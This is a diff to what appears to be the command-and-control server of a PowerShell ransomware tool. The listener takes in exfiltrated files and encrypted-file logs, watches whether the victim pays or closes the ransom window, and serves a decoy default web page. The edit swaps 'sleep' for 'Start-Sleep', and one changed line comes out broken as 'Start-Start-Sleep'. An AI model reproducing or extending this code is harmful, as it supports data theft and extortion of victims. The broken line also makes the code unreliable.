@@ -134,12 +134,12 @@ if ($context.Request.HttpMethod -eq "GET") {
       Write-Host "[!] New connection from $($context.Request.RemoteEndPoint)" -f Red }
    
    if ($context.Request.RawUrl -eq"/files") { mkdir "C2Files" 2>&1> $null 
-      Write-Host ; Write-Host "[i] Recieving exfiltrated files and decrypting.." -f Green ; sleep 2 }   
+      Write-Host ; Write-Host "[i] Recieving exfiltrated files and decrypting.." -f Green ; Start-Start-Sleep 2 }   
 
-   if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
+   if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; Start-Sleep 2
       Write-Host "[!] User as tried to pay the rescue!" -f Red }
 
-   if ($context.Request.RawUrl -eq "/close") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
+   if ($context.Request.RawUrl -eq "/close") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; Start-Sleep 2
       Write-Host "[!] User as closed the rescue window!" -f Red }
 
    if ($context.Request.RawUrl -eq "/done") { Write-Host ; Write-Host "[i] Done!" -f Green ; Write-Host ; $http.Stop() }
@@ -184,7 +184,7 @@ if ($context.Request.HttpMethod -eq "POST") {
 
    if ($context.Request.RawUrl -eq "/logs") { 
       Write-Host ; Write-Host "[i] Getting encrypted files list.." -f Green -NoNewLine
-      $B64Logs = R64Decoder -t $FormContent ; sleep 2
+      $B64Logs = R64Decoder -t $FormContent ; Start-Sleep 2
       $Logs = $B64Logs.ToString().Replace("[","`n[") ; Write-Host $Logs -f Red }
 
    [string]$html = "<h1>It Works!</h1><p>This is the default web page for this server</p>" 
